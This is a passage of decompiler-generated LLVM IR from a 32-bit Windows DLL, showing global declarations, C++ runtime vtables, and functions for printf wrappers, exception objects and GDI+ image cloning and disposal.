@global_var_10040fbc = local_unnamed_addr global i16 0
@global_var_10040fba = local_unnamed_addr global i16 0
@global_var_10040fb8 = local_unnamed_addr global i16 0
@global_var_10040fb6 = local_unnamed_addr global i16 0
@global_var_10040fb2 = local_unnamed_addr global i16 0
@global_var_1003fda0 = global i16* null
@global_var_10039d50 = external local_unnamed_addr constant i128
@global_var_10039d70 = external local_unnamed_addr constant i128
@global_var_10039d80 = external local_unnamed_addr constant i128
@global_var_10039d60 = external local_unnamed_addr constant i128
@global_var_10039d90 = external local_unnamed_addr constant i128
@global_var_10039f20 = external local_unnamed_addr constant i128
@global_var_10039f40 = external local_unnamed_addr constant i128
@global_var_10039e70 = external local_unnamed_addr constant i128
@global_var_1003a0d0 = external local_unnamed_addr constant i128
@global_var_10039d00 = external local_unnamed_addr constant i128
@global_var_10041b00 = global void ()* null
@global_var_10041a14 = global i32** null
@5 = internal constant [2 x i8] c"\0A\00"
@6 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@global_var_1003a0b0 = external local_unnamed_addr constant i128
@global_var_10039dc0 = external local_unnamed_addr constant i128
@global_var_10039e30 = external local_unnamed_addr constant i128
@global_var_1003e9f0 = local_unnamed_addr global i64 8030875174627502319
@global_var_1003a070 = external local_unnamed_addr constant i128
@global_var_10039540 = constant i16* inttoptr (i32 87 to i16*)
@global_var_10039544 = constant i16* inttoptr (i32 80 to i16*)
@global_var_10039ff0 = external local_unnamed_addr constant i128
@global_var_10039e00 = external local_unnamed_addr constant i128
@global_var_1003a080 = external local_unnamed_addr constant i128
@global_var_10039ed0 = external local_unnamed_addr constant i128
@global_var_10039e10 = external local_unnamed_addr constant i128
@global_var_10039e40 = external local_unnamed_addr constant i128
@global_var_10039de0 = external local_unnamed_addr constant i128
@global_var_100419e8 = global i16* null
@7 = internal constant [14 x i8] c"MWuFQPJLM\7FqVM\00"
@global_var_10039a50 = constant i8* getelementptr inbounds ([14 x i8], [14 x i8]* @7, i32 0, i32 0)
@global_var_10039ec0 = external local_unnamed_addr constant i128
@global_var_10039fe0 = external local_unnamed_addr constant i128
@global_var_10039fc0 = external local_unnamed_addr constant i128
@global_var_10039614 = local_unnamed_addr constant i8 0
@global_var_1003961c = local_unnamed_addr constant i16 38
@global_var_10039620 = local_unnamed_addr constant i16 61
@global_var_1003a000 = external local_unnamed_addr constant i128
@global_var_10039dd0 = external local_unnamed_addr constant i128
@global_var_10039f00 = external local_unnamed_addr constant i128
@global_var_10039fa0 = external local_unnamed_addr constant i128
@global_var_10039ef0 = external local_unnamed_addr constant i128
@global_var_10039fd0 = external local_unnamed_addr constant i128
@global_var_10039e50 = external local_unnamed_addr constant i128
@global_var_10039f70 = external local_unnamed_addr constant i128
@global_var_10039e90 = external local_unnamed_addr constant i128
@global_var_10039ea0 = external local_unnamed_addr constant i128
@global_var_1003a010 = external local_unnamed_addr constant i128
@global_var_10039f60 = external local_unnamed_addr constant i128
@global_var_10039eb0 = external local_unnamed_addr constant i128
@global_var_10039fb0 = external local_unnamed_addr constant i128
@global_var_1003a030 = external local_unnamed_addr constant i128
@global_var_1003a050 = external local_unnamed_addr constant i128
@global_var_10039e20 = external local_unnamed_addr constant i128
@global_var_1003a060 = external local_unnamed_addr constant i128
@global_var_10039e80 = external local_unnamed_addr constant i128
@global_var_1003a040 = external local_unnamed_addr constant i128
@global_var_10039f50 = external local_unnamed_addr constant i128
@global_var_10039f10 = external local_unnamed_addr constant i128
@global_var_10039e60 = external local_unnamed_addr constant i128
@global_var_10039df0 = external local_unnamed_addr constant i128
@global_var_1003a0c0 = external local_unnamed_addr constant i128
@global_var_10039f30 = external local_unnamed_addr constant i128
@global_var_1003a090 = external local_unnamed_addr constant i128
@global_var_10039da0 = external local_unnamed_addr constant i128
@global_var_10039a14 = local_unnamed_addr constant i8 0
@global_var_10039a24 = local_unnamed_addr constant i8 0
@global_var_10039a2c = local_unnamed_addr constant i8 0
@global_var_1003f2a0 = local_unnamed_addr global %_RTL_CRITICAL_SECTION* null
@global_var_1003f6f4 = local_unnamed_addr global i8 0
@global_var_1003e2f4 = local_unnamed_addr global i8 -2
@global_var_100332c0 = local_unnamed_addr constant x86_fp80 0xK7FFF8000000000000000
@global_var_10032304 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003f850 = external global i8*
@global_var_1003fd88 = external local_unnamed_addr global i8*
@global_var_1003fd80 = external local_unnamed_addr global i8*
@global_var_1003f9d0 = external global i8*
@8 = internal constant [2 x i8] c"\04\00"
@global_var_1003291c = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @8, i32 0, i32 0)
@9 = internal constant [2 x i8] c"\04\00"
@global_var_10032914 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @9, i32 0, i32 0)
@10 = internal constant [2 x i8] c"\04\00"
@global_var_10032948 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @10, i32 0, i32 0)
@global_var_10032940 = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 8 to %_RTL_CRITICAL_SECTION*)
@11 = internal constant [2 x i8] c"\05\00"
@global_var_1003296c = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @11, i32 0, i32 0)
@global_var_1003e2f0 = global i16* inttoptr (i32 67 to i16*)
@global_var_10032b48 = constant i16* inttoptr (i32 67 to i16*)
@global_var_1003e8b0 = external global i8*
@global_var_100323a4 = local_unnamed_addr constant i64 38654705667
@global_var_100323a8 = local_unnamed_addr constant i64 9
@global_var_10033210 = external local_unnamed_addr constant i128
@global_var_10033220 = external local_unnamed_addr constant i128
@global_var_10034fd8 = constant i64* null
@global_var_100353f0 = constant i128* null
@global_var_10033268 = local_unnamed_addr constant i64 -134217728
@global_var_10035c00 = constant i64* null
@global_var_10036010 = constant i128* null
@global_var_10033270 = local_unnamed_addr constant i64 -4614195897457180672
@global_var_10036820 = constant i64* inttoptr (i32 1073741824 to i64*)
@global_var_10037030 = constant i128* null
@global_var_10038040 = external local_unnamed_addr constant i128
@global_var_10038050 = external local_unnamed_addr constant i128
@global_var_10033200 = local_unnamed_addr constant i64 4843621399236968448
@global_var_10038060 = constant i128* null
@global_var_10033240 = external local_unnamed_addr constant i128
@global_var_10033260 = local_unnamed_addr constant i64 4604418534313441775
@global_var_10033250 = external local_unnamed_addr constant i128
@global_var_10033230 = external local_unnamed_addr constant i128
@global_var_10033290 = local_unnamed_addr constant double -0.000000e+00
@global_var_10033288 = local_unnamed_addr constant double 0xFFF0000000000000
@global_var_10033278 = local_unnamed_addr constant i64 9218868437227405313
@global_var_100332b0 = local_unnamed_addr constant i64 -2251799813685248
@global_var_10033280 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_100332a8 = local_unnamed_addr constant i64 4503599627370496
@global_var_10033298 = local_unnamed_addr constant i64 -9007199254740992
@global_var_100332a0 = local_unnamed_addr constant i64 9214364837600034816
@global_var_100332ca = local_unnamed_addr constant x86_fp80 0xKFFFF8000000000000000
@global_var_100332de = local_unnamed_addr constant x86_fp80 0xK400DFFFF000000000000
@global_var_100332f2 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003333e = local_unnamed_addr constant double 1.000000e+00
@global_var_10033334 = local_unnamed_addr constant x86_fp80 0xK3FFEC90FD7E45803CD14
@global_var_1003fd70 = local_unnamed_addr global i8 0
@12 = internal constant [2 x i8] c"0\00"
@global_var_10034200 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @12, i32 0, i32 0)
@global_var_10032236 = external constant i8*
@global_var_10032237 = external constant i8*
@global_var_10032234 = constant i16* inttoptr (i32 20633 to i16*)
@global_var_100388d0 = external local_unnamed_addr constant i128
@global_var_100388e0 = external local_unnamed_addr constant i128
@global_var_10038940 = external local_unnamed_addr constant i128
@global_var_100388f0 = external local_unnamed_addr constant i128
@global_var_10038900 = external local_unnamed_addr constant i128
@global_var_10038de0 = constant i128* null
@global_var_100389d0 = constant i128* null
@global_var_10038990 = external local_unnamed_addr constant i128
@global_var_100389a0 = external local_unnamed_addr constant i128
@global_var_100389b0 = external local_unnamed_addr constant i128
@global_var_10038910 = external local_unnamed_addr constant i128
@global_var_10038920 = constant i128* null
@global_var_100389c0 = external local_unnamed_addr constant i128
@global_var_10038950 = external local_unnamed_addr constant i128
@global_var_10038978 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_10038970 = local_unnamed_addr constant i64 -4503599627370496
@global_var_10038960 = local_unnamed_addr constant i64 4841369599423283200
@global_var_1002d3b4 = constant %vtable_1002d3b4_type { i32 (i8)* @function_100012c0, i32 ()* @function_100012b0 }
@global_var_1002d3cc = constant %vtable_1002d3cc_type { i32 (i8)* @function_100012c0, i32 ()* @function_100012b0 }
@global_var_1002d434 = constant %vtable_1002d434_type { i32 (i8)* @function_10001b40, i32 ()* @function_100012b0 }
@global_var_1002d44c = constant %vtable_1002d44c_type { i32 (i8)* @function_100018e0, i32 ()* @function_10001be0, i32 (i32, i32)* @function_10001bf0, i32 (i32, i32)* @function_10001940, i32 (i32, i32)* @function_100019a0, i32 (i32, i32)* @function_10001960 }
@vtable_1002d474 = local_unnamed_addr global %vtable_1002d474_type { i32 (i32)* @"??_Gios_base@std@@UAEPAXI@Z" }
@vtable_1002d4bc = local_unnamed_addr global %vtable_1002d4bc_type { i32 (i32)* @"??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ.3", i32 (i32)* @"?overflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z", i32 (i32)* @"?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z", i32 ()* @function_1000fbf3, i32 ()* @"?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 ()* @"?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 (i8*, i64)* @"?xsgetn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPAD_J@Z", i32 (i8*, i64)* @"?xsputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPBD_J@Z", i32 (i64, i32, i32)* @"?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z", i32 (i32, i32)* @"?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z", i32 (i8*, i64)* @"?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z", i32 ()* @"?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 (i32*)* @"?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z" }
@vtable_1002d4fc = local_unnamed_addr global %vtable_1002d4fc_type { i32 (i32)* @"??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z" }
@vtable_1002d504 = local_unnamed_addr global %vtable_1002d504_type { i32 (i32)* @function_1000f1f1 }
@vtable_1002d558 = local_unnamed_addr global %vtable_1002d558_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@vtable_1002d574 = local_unnamed_addr global %vtable_1002d574_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@vtable_1002d58c = local_unnamed_addr global %vtable_1002d58c_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@global_var_1002e09c = constant %vtable_1002e09c_type { i32 (i8)* @function_100056f0, i32 ()* @function_10001590, i32 ()* @function_100015a0, i32 (i32, i32, i32, i32, i32, i32)* @function_10004980, i32 (i32, i32, i32, i32, i32, i64)* @function_100049f0, i32 (i32, i32, i32, i32, i32, i64)* @function_10004b80, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004d10, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004d90, i32 (i32, i32, i32, i32, i32, i32)* @function_10004e10, i32 (i32, i32, i32, i32, i32, i32)* @function_10004e90, i32 (i32, i32, i32, i32, i8, i8)* @function_10004f10 }
@global_var_1002e0cc = constant %vtable_1002e0cc_type { i32 (i8)* @function_10006630, i32 ()* @function_10001590, i32 ()* @function_100015a0, i32 ()* @function_10005850, i32 ()* @function_10005840, i32 (i32)* @function_100057e0, i32 (i32)* @function_10005780, i32 (i32)* @function_10005720 }
@vtable_10030610 = local_unnamed_addr global %vtable_10030610_type { i32 (i32)* @"??_G_Ref_count_base@std@@UAEPAXI@Z" }
@vtable_1003061c = local_unnamed_addr global %vtable_1003061c_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@global_var_10039cac = constant %vtable_10039cac_type { i32 (i32)* @function_100011b0, i32 ()* @function_100011f0 }
@global_var_10039508 = constant [2 x i8] c"\0A\00"

define i32 @function_10001000() local_unnamed_addr {
dec_label_pc_10001000:
  %0 = call i32 @function_10007160(), !insn.addr !0
  store i32 15, i32* @global_var_10041ad8, align 4, !insn.addr !1
  store i32 0, i32* @global_var_10041ad4, align 4, !insn.addr !2
  store i8 0, i8* bitcast (i32* @global_var_10041ac4 to i8*), align 4, !insn.addr !3
  %1 = call i32 @_atexit(void ()* inttoptr (i32 268616816 to void ()*)), !insn.addr !4
  ret i32 %1, !insn.addr !5
}

define i32 @function_100010a0() local_unnamed_addr {
dec_label_pc_100010a0:
  %0 = call i32 @"??0_Init_cout@std@@QAE@XZ"(), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i32 @function_100010c0(void ()* %func) local_unnamed_addr {
dec_label_pc_100010c0:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !7
  ret i32 %0, !insn.addr !8
}

define i32 @function_100010cc(void ()* %func) local_unnamed_addr {
dec_label_pc_100010cc:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !9
  ret i32 %0, !insn.addr !10
}

define i32 @function_100010d8(void ()* %func) local_unnamed_addr {
dec_label_pc_100010d8:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !11
  ret i32 %0, !insn.addr !12
}

define i32 @function_10001100(void ()* %func) local_unnamed_addr {
dec_label_pc_10001100:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !13
  ret i32 %0, !insn.addr !14
}

define i32 @___local_stdio_printf_options(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_10001110:
  ret i32 ptrtoint (i32* @global_var_10041ae0 to i32), !insn.addr !15
}

define i32 @function_10001120(i8* %arg1) local_unnamed_addr {
dec_label_pc_10001120:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_8 = alloca i32, align 4
  %2 = call i32 @___acrt_iob_func(i32 1, i32 %0, i32 %1), !insn.addr !16
  %3 = ptrtoint i8* %arg1 to i32, !insn.addr !17
  %4 = call i32 @___local_stdio_printf_options(i32 %2, i32 %3, i32 0, i32* nonnull %stack_var_8), !insn.addr !17
  %5 = add i32 %4, 4, !insn.addr !18
  %6 = inttoptr i32 %5 to i32*, !insn.addr !18
  %7 = load i32, i32* %6, align 4, !insn.addr !18
  %8 = inttoptr i32 %4 to i32*, !insn.addr !19
  %9 = load i32, i32* %8, align 4, !insn.addr !19
  %10 = call i32 @___stdio_common_vfprintf(i32 %9, i32 %7), !insn.addr !20
  ret i32 %10, !insn.addr !21
}

define i32 @function_10001150(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10001150:
  %0 = inttoptr i32 %arg4 to i32*, !insn.addr !22
  %1 = call i32 @___local_stdio_printf_options(i32 %arg1, i32 %arg2, i32 %arg3, i32* %0), !insn.addr !22
  %2 = add i32 %1, 4, !insn.addr !23
  %3 = inttoptr i32 %2 to i32*, !insn.addr !23
  %4 = load i32, i32* %3, align 4, !insn.addr !23
  %5 = inttoptr i32 %1 to i32*, !insn.addr !24
  %6 = load i32, i32* %5, align 4, !insn.addr !24
  %7 = call i32 @___stdio_common_vsprintf_s(i32 %6, i32 %4), !insn.addr !25
  %8 = icmp sgt i32 %7, -1, !insn.addr !26
  %9 = select i1 %8, i32 %7, i32 -1, !insn.addr !27
  ret i32 %9, !insn.addr !28
}

define i32 @function_10001190(i32* %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001190:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_16 = alloca i32, align 4
  %3 = ptrtoint i8* %arg3 to i32, !insn.addr !29
  %4 = call i32 @function_10001150(i32 %2, i32 %arg2, i32 %3, i32 0, i32* nonnull %stack_var_16, i32 %1, i32 %0), !insn.addr !29
  ret i32 %4, !insn.addr !30
}

define i32 @function_100011b0(i32 %arg1) {
dec_label_pc_100011b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !31
  %2 = inttoptr i32 %1 to i32*, !insn.addr !31
  %3 = load i32, i32* %2, align 4, !insn.addr !31
  %4 = inttoptr i32 %0 to i32*, !insn.addr !32
  store i32 ptrtoint (i32* @global_var_10039cb8 to i32), i32* %4, align 4, !insn.addr !32
  %5 = inttoptr i32 %3 to i32*, !insn.addr !33
  %6 = call i32 @GdipDisposeImage(i32* %5), !insn.addr !33
  %7 = and i32 %arg1, 1
  %8 = icmp eq i32 %7, 0, !insn.addr !34
  br i1 %8, label %dec_label_pc_100011e9, label %dec_label_pc_100011cc, !insn.addr !35

dec_label_pc_100011cc:                            ; preds = %dec_label_pc_100011b0
  %9 = and i32 %arg1, 4
  %10 = icmp eq i32 %9, 0, !insn.addr !36
  %11 = icmp eq i1 %10, false, !insn.addr !37
  br i1 %11, label %dec_label_pc_100011de, label %dec_label_pc_100011d0, !insn.addr !37

dec_label_pc_100011d0:                            ; preds = %dec_label_pc_100011cc
  call void @GdipFree(i32* %4), !insn.addr !38
  ret i32 %0, !insn.addr !39

dec_label_pc_100011de:                            ; preds = %dec_label_pc_100011cc
  %12 = call i32 @___except_validate_context_record(), !insn.addr !40
  br label %dec_label_pc_100011e9, !insn.addr !41

dec_label_pc_100011e9:                            ; preds = %dec_label_pc_100011de, %dec_label_pc_100011b0
  ret i32 %0, !insn.addr !42
}

define i32 @function_100011f0() {
dec_label_pc_100011f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !43
  %1 = bitcast i32* %stack_var_-8 to i32**
  %2 = add i32 %0, 4, !insn.addr !44
  %3 = inttoptr i32 %2 to i32*, !insn.addr !44
  %4 = load i32, i32* %3, align 4, !insn.addr !44
  %5 = inttoptr i32 %4 to i32*, !insn.addr !45
  %6 = call i32 @GdipCloneImage(i32* %5, i32** nonnull %1), !insn.addr !45
  %7 = icmp eq i32 %6, 0, !insn.addr !46
  br i1 %7, label %dec_label_pc_10001212, label %dec_label_pc_1000120f, !insn.addr !47

dec_label_pc_1000120f:                            ; preds = %dec_label_pc_100011f0
  %8 = add i32 %0, 8, !insn.addr !48
  %9 = inttoptr i32 %8 to i32*, !insn.addr !48
  store i32 %6, i32* %9, align 4, !insn.addr !48
  br label %dec_label_pc_10001212, !insn.addr !48

dec_label_pc_10001212:                            ; preds = %dec_label_pc_1000120f, %dec_label_pc_100011f0
  %10 = call i32* @GdipAlloc(i32 16), !insn.addr !49
  %11 = icmp eq i32* %10, null, !insn.addr !50
  br i1 %11, label %dec_label_pc_10001235, label %dec_label_pc_1000121e, !insn.addr !51

dec_label_pc_1000121e:                            ; preds = %dec_label_pc_10001212
  %12 = ptrtoint i32* %10 to i32, !insn.addr !49
  %13 = add i32 %0, 8, !insn.addr !52
  %14 = inttoptr i32 %13 to i32*, !insn.addr !52
  %15 = load i32, i32* %14, align 4, !insn.addr !52
  %16 = load i32, i32* %stack_var_-8, align 4, !insn.addr !53
  store i32 ptrtoint (i32* @global_var_10039cb8 to i32), i32* %10, align 4, !insn.addr !54
  %17 = add i32 %12, 4, !insn.addr !55
  %18 = inttoptr i32 %17 to i32*, !insn.addr !55
  store i32 %16, i32* %18, align 4, !insn.addr !55
  %19 = add i32 %12, 8, !insn.addr !56
  %20 = inttoptr i32 %19 to i32*, !insn.addr !56
  store i32 %15, i32* %20, align 4, !insn.addr !56
  ret i32 %12, !insn.addr !57

dec_label_pc_10001235:                            ; preds = %dec_label_pc_10001212
  ret i32 0, !insn.addr !58
}

define i32 @"??0exception@std@@QAE@QBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001240:
  %0 = call i128 @__decompiler_undefined_function_4()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !59
  %3 = add i32 %1, 4, !insn.addr !60
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %result, align 4, !insn.addr !61
  %4 = inttoptr i32 %3 to i64*, !insn.addr !62
  %5 = load i64, i64* %4, align 4, !insn.addr !62
  call void @__asm_movq.38(i64 %5, i128 %2), !insn.addr !62
  %6 = call i32 @___std_exception_copy(), !insn.addr !63
  ret i32 %1, !insn.addr !64
}

define i32 @"??0exception@std@@QAE@ABV01@@Z"(i32* %result, i32* %arg2) local_unnamed_addr {
dec_label_pc_10001280:
  %0 = call i128 @__decompiler_undefined_function_4()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !65
  %3 = add i32 %1, 4, !insn.addr !66
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %result, align 4, !insn.addr !67
  %4 = inttoptr i32 %3 to i64*, !insn.addr !68
  %5 = load i64, i64* %4, align 4, !insn.addr !68
  call void @__asm_movq.38(i64 %5, i128 %2), !insn.addr !68
  %6 = call i32 @___std_exception_copy(), !insn.addr !69
  ret i32 %1, !insn.addr !70
}

define i32 @function_100012b0() {
dec_label_pc_100012b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !71
  %2 = inttoptr i32 %1 to i32*, !insn.addr !71
  %3 = load i32, i32* %2, align 4, !insn.addr !71
  %4 = icmp eq i32 %3, 0, !insn.addr !72
  %5 = icmp eq i1 %4, false, !insn.addr !73
  %6 = select i1 %5, i32 %3, i32 ptrtoint ([18 x i8]* @global_var_10039bb4 to i32), !insn.addr !73
  ret i32 %6, !insn.addr !74
}

define i32 @function_100012c0(i8 %arg1) {
dec_label_pc_100012c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !75
  %4 = inttoptr i32 %2 to i32*, !insn.addr !76
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !76
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !77
  %6 = and i8 %arg1, 1, !insn.addr !78
  %7 = icmp eq i8 %6, 0, !insn.addr !78
  br i1 %7, label %dec_label_pc_100012e9, label %dec_label_pc_100012de, !insn.addr !79

dec_label_pc_100012de:                            ; preds = %dec_label_pc_100012c0
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !80
  br label %dec_label_pc_100012e9, !insn.addr !81

dec_label_pc_100012e9:                            ; preds = %dec_label_pc_100012de, %dec_label_pc_100012c0
  ret i32 %2, !insn.addr !82
}

define i32 @"??0bad_cast@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001310:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !83
  %3 = add i32 %0, 4, !insn.addr !84
  %4 = inttoptr i32 %3 to i64*, !insn.addr !84
  %5 = load i64, i64* %4, align 4, !insn.addr !84
  call void @__asm_movq.38(i64 %5, i128 %2), !insn.addr !84
  %6 = inttoptr i32 %3 to i32*, !insn.addr !85
  store i32 ptrtoint ([9 x i8]* @global_var_10039bc8 to i32), i32* %6, align 4, !insn.addr !85
  %7 = inttoptr i32 %0 to i32*, !insn.addr !86
  store i32 ptrtoint (%vtable_1002d3cc_type* @global_var_1002d3cc to i32), i32* %7, align 4, !insn.addr !86
  ret i32 %0, !insn.addr !87
}

define i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001330:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !88
  %eax.0.reg2mem = alloca i32, !insn.addr !88
  %0 = call i128 @__decompiler_undefined_function_4()
  %1 = ptrtoint i8* %arg2 to i32
  %2 = ptrtoint i32* %result to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %3 = call i64 @__decompiler_undefined_function_5()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = call i32 @__readfsdword(i32 0), !insn.addr !89
  store i32 %4, i32* %stack_var_-16, align 4, !insn.addr !90
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !91
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !92
  store i32 0, i32* %stack_var_-52, align 4, !insn.addr !93
  %6 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %2), !insn.addr !94
  %7 = add i32 %2, 4, !insn.addr !95
  %8 = inttoptr i32 %7 to i32*, !insn.addr !95
  store i32 0, i32* %8, align 4, !insn.addr !95
  %9 = add i32 %2, 8, !insn.addr !96
  %10 = inttoptr i32 %9 to i8*, !insn.addr !96
  store i8 0, i8* %10, align 1, !insn.addr !96
  %11 = add i32 %2, 12, !insn.addr !97
  %12 = inttoptr i32 %11 to i32*, !insn.addr !97
  store i32 0, i32* %12, align 4, !insn.addr !97
  %13 = add i32 %2, 16, !insn.addr !98
  %14 = inttoptr i32 %13 to i8*, !insn.addr !98
  store i8 0, i8* %14, align 1, !insn.addr !98
  %15 = add i32 %2, 20, !insn.addr !99
  %16 = inttoptr i32 %15 to i32*, !insn.addr !99
  store i32 0, i32* %16, align 4, !insn.addr !99
  %17 = add i32 %2, 24, !insn.addr !100
  %18 = inttoptr i32 %17 to i16*, !insn.addr !100
  store i16 0, i16* %18, align 2, !insn.addr !100
  %19 = add i32 %2, 28, !insn.addr !101
  %20 = inttoptr i32 %19 to i32*, !insn.addr !101
  store i32 0, i32* %20, align 4, !insn.addr !101
  %21 = add i32 %2, 32, !insn.addr !102
  %22 = inttoptr i32 %21 to i16*, !insn.addr !102
  store i16 0, i16* %22, align 2, !insn.addr !102
  %23 = add i32 %2, 36, !insn.addr !103
  %24 = inttoptr i32 %23 to i32*, !insn.addr !103
  store i32 0, i32* %24, align 4, !insn.addr !103
  %25 = add i32 %2, 40, !insn.addr !104
  %26 = inttoptr i32 %25 to i8*, !insn.addr !104
  store i8 0, i8* %26, align 1, !insn.addr !104
  %27 = add i32 %2, 44, !insn.addr !105
  %28 = inttoptr i32 %27 to i32*, !insn.addr !105
  store i32 0, i32* %28, align 4, !insn.addr !105
  %29 = add i32 %2, 48, !insn.addr !106
  %30 = inttoptr i32 %29 to i8*, !insn.addr !106
  store i8 0, i8* %30, align 1, !insn.addr !106
  %31 = icmp eq i8* %arg2, null, !insn.addr !107
  %32 = icmp eq i1 %31, false, !insn.addr !108
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !108
  store i32* %stack_var_-52, i32** %esp.0.in.reg2mem, !insn.addr !108
  br i1 %32, label %dec_label_pc_100013e9, label %dec_label_pc_100013aa, !insn.addr !108

dec_label_pc_100013aa:                            ; preds = %dec_label_pc_10001330
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10039bd4, i32 0, i32 0), i8** %stack_var_-28, align 4, !insn.addr !109
  %33 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !110
  %34 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !111
  store i32 %34, i32* %stack_var_-60, align 4, !insn.addr !111
  %35 = mul i64 %3, 4294967296
  %36 = sdiv i64 %35, 4294967296, !insn.addr !112
  call void @__asm_movq.38(i64 %36, i128 %33), !insn.addr !112
  %37 = call i32 @___std_exception_copy(), !insn.addr !113
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %stack_var_-40, align 4, !insn.addr !114
  %38 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !115
  store i32 %38, i32* %stack_var_-60, align 4, !insn.addr !115
  %39 = call i32 @"__CxxThrowException@8"(), !insn.addr !116
  store i32 %39, i32* %eax.0.reg2mem, !insn.addr !116
  store i32* %stack_var_-60, i32** %esp.0.in.reg2mem, !insn.addr !116
  br label %dec_label_pc_100013e9, !insn.addr !116

dec_label_pc_100013e9:                            ; preds = %dec_label_pc_100013aa, %dec_label_pc_10001330
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %40 = add i32 %esp.0, -4, !insn.addr !117
